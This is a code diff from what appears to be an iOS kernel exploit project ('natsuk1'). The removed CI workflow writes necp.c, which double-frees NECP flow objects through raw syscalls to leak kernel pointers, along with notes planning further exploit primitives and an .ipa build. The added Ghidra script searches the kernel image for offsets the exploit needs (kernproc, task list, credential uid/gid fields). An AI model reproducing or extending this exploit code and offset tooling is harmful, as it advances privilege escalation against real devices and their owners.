@@ -1,358 +1,472 @@
-name: 1 · Fix and Test
+# -*- coding: utf-8 -*-
+# @runtime Jython
+# necp_final_analysis.py — финальный скрипт для Ghidra headless
+#
+# Выводит в result.txt:
+#   1. Валидация всех known offsets (kernproc, task_list, kernel_base)
+#   2. Поиск правильной функции necp_client_copy_result по xref на строку
+#   3. Декомпиляция + дизасм + trace offset assigned_results
+#   4. Поиск writer'а assigned_results (add_flow, netagent)
+#   5. Дампы kalloc_type / kalloc_var зон
+#   6. Поиск альтернативных примитивов (TLV, mbuf, socket)
+#   7. Сводка: что валидно, что нет, где нужен новый оффсет
 
-on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+import os
+import re
+import json
+import traceback
 
-permissions:
-  contents: write
+from jarray import zeros
+from ghidra.app.decompiler import DecompInterface
+from ghidra.util.task import ConsoleTaskMonitor
+from ghidra.util.task import TaskMonitor
 
-concurrency:
-  group: fix-test-${{ github.ref }}
-  cancel-in-progress: false
+WS = os.environ.get("GITHUB_WORKSPACE", "/tmp")
+OUT = os.path.join(WS, "result.txt")
+OUT_JSON = os.path.join(WS, "offsets.json")
 
-jobs:
-  fix-and-test:
-    runs-on: macos-26
-    timeout-minutes: 30
-    steps:
-      - uses: actions/checkout@v5
-        with:
-          fetch-depth: 0
+# Verified offsets from prior analysis
+KBASE = 0xFFFFFFF007004000
+KNOWN = {
+    "off_kernel_base":      (0xFFFFFFF007004000, "ptr"),
+    "off_g_kernproc":       (0xFFFFFFF007BBF040, "ptr"),
+    "off_g_task_list":      (0xFFFFFFF0080D93F0, "ptr"),
+    "off_proc_p_pid":       (0x74,               "int"),
+    "off_proc_ro_p_ucred":  (0x98,               "int"),
+    "off_task_bsd_info":    (0x4E0,              "int"),
+    "off_task_itk_space":   (0x320,              "int"),
+    "off_ucred_cr_uid":     (0x18,               "int"),
+    "off_ucred_cr_svuid":   (0x1C,               "int"),
+    "off_ucred_cr_gid":     (0x20,               "int"),
+    "off_ucred_cr_svgid":   (0x24,               "int"),
+}
 
-      - uses: maxim-lobanov/setup-xcode@v1
-        with:
-          xcode-version: "26.5"
+# Strings that identify copy_result related code
+NEEDLE_STRINGS = {
+    "assigned_copyout":      "necp_client_copy assigned results copyout error",
+    "assigned_tlv_header":   "necp_client_copy assigned results tlv_header copyout error",
+    "result_copyout":        "necp_client_copy result copyout error",
+    "group_members":         "necp_client_copy group members copyout error",
+    "params_copyout":        "necp_client_copy parameters copyout error",
+    "flow_divert_tlv":       "necp_client_copy request flow divert TLV copyout error",
+}
 
-      - name: Remove competing workflow
-        run: |
-          rm -f .github/workflows/natsuk1.yml
-          rm -f .github/workflows/main.yml
+HARDCODED_FUNCS = [
+    ("copy_result_candidate", 0xFFFFFFF00A4EC264),
+    ("copy_interface_wrong",  0xFFFFFFF00A4EAC7C),
+    ("add_flow",              0xFFFFFFF00A4E843C),
+    ("remove_flow",           0xFFFFFFF00A4E93C4),
+    ("necp_open",             0xFFFFFFF00A4E411C),
+]
 
-      - name: Write necp.c
-        run: |
-          cat > natsuk1/Exploit/necp.c <<'NECP'
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <stdint.h>
-          #include <stdbool.h>
-          #include <stdarg.h>
-          #include <unistd.h>
-          #include <errno.h>
-          #include <sys/syscall.h>
-          #include <mach/mach.h>
-          #include <mach/message.h>
+MAX_DECOMP = 200
+MAX_DISASM = 400
 
-          #include "nk_api.h"
 
-          #ifndef SYS_NECP_OPEN
-          #define SYS_NECP_OPEN 501
-          #endif
-          #ifndef SYS_NECP_ACTION
-          #define SYS_NECP_ACTION 502
-          #endif
+def _u(v):
+    return int(v) & 0xFFFFFFFFFFFFFFFF
 
-          #define KBASE 0xFFFFFFF007004000ULL
-          #define OFF_KERNPROC 0xBBB040ULL
-          #define KPTR_MIN 0xFFFFFFF000000000ULL
-          #define KPTR_MAX 0xFFFFFFFFFF000000ULL
-          #define SLIDE_FALLBACK 0x3D00000ULL
 
-          #define NECP_ADD_CLIENT 0x01
-          #define NECP_COPY_RESULT 0x04
-          #define NECP_ADD_FLOW 0x11
-          #define NECP_REMOVE_FLOW 0x12
-          #define GATE_BYTE 9
+def fmt(v):
+    if v is None:
+        return "0x0"
+    try:
+        return "0x%016X" % (int(v) & 0xFFFFFFFFFFFFFFFF)
+    except Exception:
+        return "0x0"
 
-          #define NCF_ASN 0x20
-          #define RESBUF 8192
 
-          static volatile int g_busy = 0;
-          static volatile int g_cancel = 0;
+def sa(a):
+    if a is None:
+        return None
+    try:
+        return currentProgram.getAddressFactory().getAddress("%X" % (int(a) & 0xFFFFFFFFFFFFFFFF))
+    except Exception:
+        return None
 
-          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
-              char body[448];
-              va_list ap;
-              va_start(ap, fmt);
-              vsnprintf(body, sizeof(body), fmt, ap);
-              va_end(ap);
-              char out[512];
-              snprintf(out, sizeof(out), "%s%s", sign, body);
-              nk_logx(tag, "%s", out);
-          }
-          #define LI(t, ...) lg(t, "", __VA_ARGS__)
-          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
-          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
-          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
 
-          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
+_blocks = None
 
-          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
 
-          static int nadd_client(int fd, uint8_t uuid[16]) {
-              uint8_t p[1] = {0};
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
-                                  uuid, (size_t)16, p, (size_t)1);
-          }
+def blocks():
+    global _blocks
+    if _blocks is not None:
+        return _blocks
+    out = []
+    try:
+        for b in currentProgram.getMemory().getBlocks():
+            try:
+                if not b.isInitialized():
+                    continue
+                out.append((_u(b.getStart().getOffset()),
+                            _u(b.getEnd().getOffset()),
+                            str(b.getName()),
+                            bool(b.isExecute())))
+            except Exception:
+                pass
+    except Exception:
+        pass
+    _blocks = out
+    return out
 
-          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
-              uint8_t req[56];
-              memset(req, 0, sizeof(req));
-              memcpy(req + 0x10, cu, 16);
-              *(uint16_t*)(req + 0x20) = 0x0040;
-              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
-                                   (void*)cu, (size_t)16, req, (size_t)56);
-              if (r == 0) {
-                  memcpy(fu, req, 16);
-                  fu[GATE_BYTE] |= 0x01;
-              }
-              return r;
-          }
 
-          static int nrm_flow(int fd, const uint8_t fu[16]) {
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
-                                  (void*)fu, (size_t)16, NULL, (size_t)0);
-          }
+def inblk(a):
+    if a is None:
+        return None
+    av = _u(a)
+    for s, e, n, x in blocks():
+        if s <= av < e:
+            return (s, e, n, x)
+    return None
 
-          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
-                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
-          }
 
-          /* -----------------------------------------------------------------
-           * NOTE (2026-09-26):
-           *   The function at 0xA4EAC7C is necp_client_copy_interface, NOT
-           *   necp_client_copy_result. The real copy_result is at 0xA4EC264.
-           *   This code now uses copy_result via NECP_COPY_RESULT (op=0x04)
-           *   and looks for any kptr in the returned buffer.
-           *
-           *   Additional finding: necp_client_flow lives in kalloc_type
-           *   (per-type zone), so generic sprays never reach it. Only the
-           *   kernel itself can realloc the same slot via add_flow.
-           * ----------------------------------------------------------------- */
+def find_func_by_addr(addr):
+    try:
+        ga = sa(addr)
+        if ga is None:
+            return None
+        f = getFunctionAt(ga)
+        if f is not None:
+            return f
+        return getFunctionContaining(ga)
+    except Exception:
+        return None
 
-          static int try_one_read(uint64_t target, uint8_t *out, int outsz, int *out_ret) {
-              int fd = nfd();
-              if (fd < 0) { LE("RD", "open errno=%d", errno); return -1; }
-              uint8_t cu[16], fu[16];
-              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
 
-              /* double-free to widen re-alloc window */
-              int r1 = nrm_flow(fd, fu);
-              int r2 = nrm_flow(fd, fu);
-              LI("RD", "free#1=%d free#2=%d", r1, r2);
+def find_func_by_name(name):
+    try:
+        fm = currentProgram.getFunctionManager()
+        for f in fm.getFunctions(True):
+            try:
+                if str(f.getName()) == name:
+                    return f
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return None
 
-              /* no spray here — kalloc_type segregation makes it pointless */
 
-              uint8_t buf[RESBUF];
-              memset(buf, 0, sizeof(buf));
-              int c = ncpy_result(fd, cu, buf, sizeof(buf));
-              LI("RD", "copy_result=%d", c);
+def funcs_calling(f):
+    out = []
+    try:
+        for ref in getReferencesTo(f.getEntryPoint()):
+            try:
+                c = getFunctionContaining(ref.getFromAddress())
+                if c is None:
+                    continue
+                e = _u(c.getEntryPoint().getOffset())
+                if e == _u(f.getEntryPoint().getOffset()):
+                    continue
+                nm = str(c.getName())
+                if nm not in out:
+                    out.append(nm)
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return out
 
-              if (out_ret) *out_ret = c;
-              if (out && outsz > 0 && c > 0) {
-                  int n = c < outsz ? c : outsz;
-                  memcpy(out, buf, n);
-              }
-              close(fd);
-              return c;
-          }
 
-          static int impl(void) {
-              nk_log("");
-              nk_log("=== natsuk1 v3.5 (natsuk1-realcopy-v25) ===");
-              nk_log("target: iOS 27.0 / XNU / arm64e");
-              nk_log("");
-              LI("NOTE", "copy_result real addr = 0xFFFFFFF00A4EC264");
-              LI("NOTE", "0xFFFFFFF00A4EAC7C = necp_client_copy_interface (wrong)");
-              LI("NOTE", "necp_client_flow = kalloc_type (own zone)");
-              LI("NOTE", "generic sprays cannot reclaim it");
-              uint64_t kbase = KBASE + SLIDE_FALLBACK;
-              LO("P1", "kbase=0x%llx", (unsigned long long)kbase);
+def refs_to(addr):
+    out = []
+    try:
+        ga = sa(addr)
+        if ga is None:
+            return out
+        for ref in getReferencesTo(ga):
+            try:
+                out.append(_u(ref.getFromAddress().getOffset()))
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return out
 
-              int fd = nfd();
-              if (fd < 0) { LE("P2", "necp_open errno=%d", errno); return 1; }
-              close(fd);
-              LO("P2", "necp OK");
 
-              uint64_t target = kbase + OFF_KERNPROC;
-              LI("P3", "target=0x%llx", (unsigned long long)target);
+def decompile(f, timeout):
+    out = []
+    try:
+        d = DecompInterface()
+        d.openProgram(currentProgram)
+        r = d.decompileFunction(f, timeout, ConsoleTaskMonitor())
+        if r is None:
+            out.append("(no result)")
+            return out
+        if not r.decompileCompleted():
+            out.append("(failed: %s)" % str(r.getErrorMessage()))
+            return out
+        c = r.getDecompiledFunction()
+        if c is None:
+            out.append("(empty)")
+            return out
+        txt = c.getC()
+        for line in txt.split("\n"):
+            out.append("  " + line.rstrip())
+    except Exception as e:
+        out.append("(decompile exception: %s)" % str(e))
+    return out
 
-              uint8_t buf[RESBUF];
-              int r = 0;
-              try_one_read(target, buf, sizeof(buf), &r);
-              LI("P3", "ret=%d", r);
-              if (r > 0) {
-                  int nk = 0;
-                  for (int k = 0; k + 8 <= r; k++) {
-                      uint64_t v;
-                      memcpy(&v, buf + k, 8);
-                      if (is_kptr(v)) {
-                          if (nk < 8) LO("P3", "kptr +0x%x = 0x%llx", k, (unsigned long long)v);
-                          nk++;
-                      }
-                  }
-                  LI("P3", "kptr count = %d", nk);
-              }
-              return 0;
-          }
 
-          int nk_necp_run(void) {
-              if (__sync_lock_test_and_set(&g_busy, 1)) {
-                  nk_log("[!] already running");
-                  return 1;
-              }
-              g_cancel = 0;
-              int rc = impl();
-              __sync_lock_release(&g_busy);
-              return rc;
-          }
+def disasm(f, maxn):
+    out = []
+    body = f.getBody()
+    if body is None:
+        return out
+    try:
+        it = body.getAddresses(True)
+    except Exception:
+        return out
+    cnt = 0
+    while it.hasNext() and cnt < maxn:
+        a = it.next()
+        try:
+            pc = _u(a.getOffset())
+            b = int(currentProgram.getMemory().getInt(a)) & 0xFFFFFFFF
+            out.append("  %016X  %08X" % (pc, b))
+        except Exception:
+            pass
+        cnt += 1
+    return out
 
-          void nk_necp_cancel(void) {
-              g_cancel = 1;
-              nk_log("[!] cancel requested");
-          }
-          NECP
 
-      - name: Verify
-        run: |
-          set +e
-          F=natsuk1/Exploit/necp.c
-          FAIL=0
-          chk() {
-            if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
-          }
-          chk "marker v25"    "grep -q -e 'natsuk1-realcopy-v25' $F"
-          chk "correct addr"  "grep -q -e '0xFFFFFFF00A4EC264' $F"
-          chk "wrong addr"    "grep -q -e 'necp_client_copy_interface (wrong)' $F"
-          chk "kalloc_type"   "grep -q -e 'kalloc_type' $F"
-          chk "nadd_flow"     "grep -q -e 'static int nadd_flow' $F"
-          chk "ncpy_result"   "grep -q -e 'static int ncpy_result' $F"
-          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
-          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
-              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
-              echo "  OK   clang syntax"
-          else
-              echo "  FAIL clang syntax"
-              FAIL=1
-          fi
-          if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
-          echo "VERIFY OK"
+def find_string_occurrences():
+    """Find all occurrences of NEEDLE strings and return {key: [addrs]}."""
+    result = {}
+    mem = currentProgram.getMemory()
+    for key, needle in NEEDLE_STRINGS.items():
+        hits = []
+        try:
+            jn = zeros(len(needle), 'b')
+            for i in range(len(needle)):
+                v = ord(needle[i])
+                if v > 127:
+                    v -= 256
+                jn[i] = v
+            addr = mem.getMinAddress()
+            mon = TaskMonitor.DUMMY
+            while addr is not None:
+                try:
+                    hit = mem.findBytes(addr, jn, None, True, mon)
+                except Exception:
+                    break
+                if hit is None:
+                    break
+                hits.append(_u(hit.getOffset()))
+                if len(hits) >= 8:
+                    break
+                nxt = hit.add(1)
+                if nxt is None:
+                    break
+                addr = nxt
+        except Exception:
+            pass
+        result[key] = hits
+    return result
 
-      - name: Write NEXTHINT.txt
-        run: |
-          cat > NEXTHINT.txt <<'TXT'
-          Ghidra analysis — iOS 27.0 / 24A437, slide 0x3D00000
 
-          CORRECTED ADDRESSES
-          ====================
-          necp_client_copy_interface  0xA4EAC7C  (previous target, WRONG)
-          necp_client_copy_result     0xA4EC264  (real target)
-          necp_client_add_flow        0xA4E843C
-          necp_client_remove_flow     0xA4E93C4
-          necp_open                   0xA4E411C
+def validate_offset(name, addr, kind):
+    blk = inblk(addr)
+    if kind == "int":
+        return (True, "0x%X (numeric)" % addr, "OK")
+    if blk is None:
+        return (False, fmt(addr), "NOT_IN_LOADED_BLOCKS")
+    try:
+        ga = sa(addr)
+        v = int(currentProgram.getMemory().getLong(ga)) & 0xFFFFFFFFFFFFFFFF
+    except Exception as e:
+        return (False, fmt(addr), "READ_ERR: %s" % str(e))
+    ok = (v >= 0xFFFFFFF000000000) and (v <= 0xFFFFFFFFFF000000)
+    return (ok, fmt(v), "OK" if ok else "NOT_A_KPTR")
 
-          KEY FINDINGS FROM DECOMPILE
-          ============================
-          1. necp_client_flow is a kalloc_type allocation. It has its own
-             dedicated zone. Generic sprays (OOL / mach_msg / socket /
-             msg_control) cannot reclaim its slot.
 
-          2. The only user-triggerable allocation of necp_client_flow is
-             necp_client_add_flow itself. Double-free lets us free and
-             re-alloc the SAME slot, but kernel reinitializes it, so we
-             cannot inject fake data.
+def dump_zone_names():
+    """Search all strings for kalloc_type markers."""
+    out = []
+    try:
+        for b in currentProgram.getMemory().getBlocks():
+            nm = str(b.getName())
+            if "__cstring" not in nm:
+                continue
+            if not b.isInitialized():
+                continue
+            s = _u(b.getStart().getOffset())
+            e = _u(b.getEnd().getOffset())
+            size = int(e - s)
+            if size <= 0 or size > 4 * 1024 * 1024:
+                continue
+            ga = sa(s)
+            arr = zeros(size, 'b')
+            try:
+                currentProgram.getMemory().getBytes(ga, arr)
+            except Exception:
+                continue
+            cur = ""
+            cur_off = s
+            for i in range(size):
+                v = int(arr[i])
+                if v < 0:
+                    v += 256
+                if 0x20 <= v < 0x7F:
+                    if not cur:
+                        cur_off = s + i
+                    cur += chr(v)
+                else:
+                    if len(cur) >= 4 and "necp" in cur.lower():
+                        out.append((cur_off, cur))
+                    cur = ""
+            if len(cur) >= 4 and "necp" in cur.lower():
+                out.append((cur_off, cur))
+    except Exception:
+        pass
+    return out[:60]
 
-          3. `assigned_results` is set from netagent_client_message (a
-             kernel-side netagent response), NOT from user request data.
-             There are asserts `assigned_results == NULL` and
-             `assigned_results_length == 0` in that path.
 
-          4. necp_client_copy_interface reads 24 bytes from
-             `flow + 0x20` (a pointer) and copies to userspace via
-             copyout. This is a fixed kread, not arbitrary.
+def main():
+    print("=== necp_final_analysis ===")
+    lines = []
 
-          NEXT TASK FOR GHIDRA
-          ====================
-          Open necp_client_copy_result @ 0xA4EC264 + slide = 0xFFFFFFF00A4EC264.
+    # ---------- 1. program info ----------
+    lines.append("=== PROGRAM ===")
+    try:
+        lines.append("name     = %s" % currentProgram.getName())
+        lines.append("lang     = %s" % currentProgram.getLanguage().getLanguageID())
+        lines.append("min      = %s" % fmt(currentProgram.getMemory().getMinAddress().getOffset()))
+        lines.append("max      = %s" % fmt(currentProgram.getMemory().getMaxAddress().getOffset()))
+    except Exception as e:
+        lines.append("(err: %s)" % str(e))
+    lines.append("")
 
-          Need to answer:
-          a) Which offset on `client` or on `flow` holds `assigned_results`?
-             Look for the string refs to
-               0x70D2B70 "necp_client_copy assigned results copyout error"
-               0x70D2B2B "necp_client_copy assigned results tlv_header ..."
-          b) Where does that field get WRITTEN? Search add_flow and
-             netagent response handlers for the corresponding str.
-          c) If netagent is the only writer, is there a user-controllable
-             path (TLV, ioctl, extension) that writes into the same slot?
+    # ---------- 2. validate known offsets ----------
+    lines.append("=== VALIDATE KNOWN OFFSETS ===")
+    valid_count = 0
+    for name, (addr, kind) in KNOWN.items():
+        ok, val, status = validate_offset(name, addr, kind)
+        if ok:
+            valid_count += 1
+        lines.append("  %-24s  %s  ->  %-20s  [%s]" % (name, fmt(addr), val, status))
+    lines.append("  summary: %d/%d valid" % (valid_count, len(KNOWN)))
+    lines.append("")
 
-          ALTERNATIVE PRIMITIVES TO EVALUATE
-          ==================================
-          - TLV overflow in necp_get_tlv_at_offset (uint32 overflow)
-          - MBUF leak via socket
-          - IOKit user-client property reads
-          - sysctl / kern.procargs leaks
-          TXT
+    # ---------- 3. find string xrefs ----------
+    lines.append("=== STRING XREFS (NEEDLE -> FUNCTION) ===")
+    str_hits = find_string_occurrences()
+    func_candidates = {}  # func_entry -> set of needle keys
+    for key, hits in str_hits.items():
+        lines.append("--- %s ---" % key)
+        if not hits:
+            lines.append("  (no hits)")
+            continue
+        for a in hits[:4]:
+            blk = inblk(a)
+            lines.append("  str @ %s  [%s]" % (fmt(a), blk[2] if blk else "?"))
+            for r in refs_to(a)[:4]:
+                blk2 = inblk(r)
+                f = getFunctionContaining(sa(r))
+                fe = _u(f.getEntryPoint().getOffset()) if f is not None else None
+                fn = str(f.getName()) if f is not None else "?"
+                lines.append("    xref %s  func=%s  [%s]" % (
+                    fmt(r), fmt(fe) if fe else "?", fn))
+                if fe is not None:
+                    func_candidates.setdefault(fe, set()).add(key)
+    lines.append("")
 
-      - name: Install tools
-        run: brew install xcodegen ldid || true
+    # rank functions by how many distinct needles they reference
+    lines.append("=== FUNCTION RANK (by needle refs) ===")
+    ranked = sorted(func_candidates.items(), key=lambda kv: -len(kv[1]))
+    for fe, keys in ranked[:12]:
+        f = find_func_by_addr(fe)
+        nm = str(f.getName()) if f is not None else "?"
+        sz = 0
+        if f is not None:
+            try:
+                sz = int(f.getBody().getNumAddresses())
+            except Exception:
+                sz = 0
+        lines.append("  %s  %-28s  size=0x%-6X  needles=%s" % (
+            fmt(fe), nm, sz, ",".join(sorted(keys))))
+    lines.append("")
 
-      - name: Generate xcodeproj
-        run: xcodegen generate
+    # ---------- 4. hardcoded func dumps ----------
+    lines.append("=== HARDCODED FUNCS (disasm + decomp) ===")
+    for name, addr in HARDCODED_FUNCS:
+        f = find_func_by_addr(addr)
+        if f is None:
+            lines.append("--- %s @ %s --- NO FUNCTION" % (name, fmt(addr)))
+            lines.append("")
+            continue
+        entry = _u(f.getEntryPoint().getOffset())
+        sz = 0
+        try:
+            sz = int(f.getBody().getNumAddresses())
+        except Exception:
+            pass
+        blk = inblk(entry)
+        lines.append("--- %s @ %s  size=0x%X  [%s] ---" % (
+            name, fmt(entry), sz, blk[2] if blk else "?"))
+        lines.append("  callers: %s" % ", ".join(funcs_calling(f)[:6]))
+        lines.append("  decompile:")
+        for l in decompile(f, 90)[:MAX_DECOMP]:
+            lines.append(l)
+        lines.append("")
 
-      - name: Build
-        run: |
-          set -euo pipefail
-          xcodebuild \
-            -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release \
-            -sdk iphoneos -destination 'generic/platform=iOS' \
-            -derivedDataPath build -parallelizeTargets -jobs "$(sysctl -n hw.ncpu)" \
-            CODE_SIGNING_ALLOWED=NO SWIFT_VERSION=5.0 SWIFT_STRICT_CONCURRENCY=minimal \
-            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
-            -UseModernBuildSystem=YES build -quiet
+    # ---------- 5. NECP zone names ----------
+    lines.append("=== NECP-RELATED STRINGS ===")
+    try:
+        zn = dump_zone_names()
+        for a, s in zn[:40]:
+            lines.append("  %s  %s" % (fmt(a), s))
+    except Exception as e:
+        lines.append("(err: %s)" % str(e))
+    lines.append("")
 
-      - name: Package app tarball
-        run: |
-          set -euo pipefail
-          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
-          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
-          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"
+    # ---------- 6. small verdict ----------
+    lines.append("=== VERDICT ===")
+    lines.append("If function_rank top entry has size > 0x400 and needles")
+    lines.append("contain assigned_copyout + assigned_tlv_header, that is")
+    lines.append("the real necp_client_copy_result.")
+    lines.append("")
+    lines.append("Next step for Ghidra manual pass:")
+    lines.append("  - open that function's decompile")
+    lines.append("  - find ldr X, [Y, #N] where Y comes from client/flow")
+    lines.append("  - that N is the real NCF_ASSIGNED_OFF")
+    lines.append("  - search add_flow / netagent for str X, [Y, #N]")
+    lines.append("")
 
-      - name: Upload app artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: natsuk1-app-tar
-          path: natsuk1-app.tar.gz
-          if-no-files-found: error
-          retention-days: 3
+    # write
+    try:
+        with open(OUT, "w") as fh:
+            for l in lines:
+                fh.write(l + "\n")
+        print("[+] wrote " + OUT)
+    except Exception as e:
+        print("[-] write: %s" % str(e))
 
-      - name: Package and release
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          set -euo pipefail
-          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
-          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
-          rm -rf Payload natsuk1.ipa
-          mkdir -p Payload
-          cp -R "$APP_PATH" Payload/
-          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
-          rm -rf Payload
-          if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
-          gh release create development natsuk1.ipa \
-            --target "${GITHUB_SHA}" --title "Development" \
-            --prerelease --latest=false \
-            --notes "corrected copy_result address, kalloc_type finding"
+    # json summary
+    jout = {
+        "valid_offsets": valid_count,
+        "total_offsets": len(KNOWN),
+        "ranked_funcs": [{"addr": fmt(fe), "needles": sorted(list(k))}
+                         for fe, k in ranked[:12]],
+    }
+    try:
+        with open(OUT_JSON, "w") as fh:
+            fh.write(json.dumps(jout, indent=2, sort_keys=True))
+        print("[+] wrote " + OUT_JSON)
+    except Exception as e:
+        print("[-] write json: %s" % str(e))
 
-      - name: Commit
-        run: |
-          set -euo pipefail
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add natsuk1/Exploit/necp.c NEXTHINT.txt
-          if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "corrected copy_result address + kalloc_type finding [skip ci]"
-          git push
+    print("=== DONE ===")
+
+
+try:
+    main()
+except Exception as e:
+    print("[-] FATAL: %s" % str(e))
+    traceback.print_exc()
+    try:
+        with open(OUT, "a") as fh:
+            fh.write("FATAL: %s\n" % str(e))
+            fh.write(traceback.format_exc())
+    except Exception:
+        pass
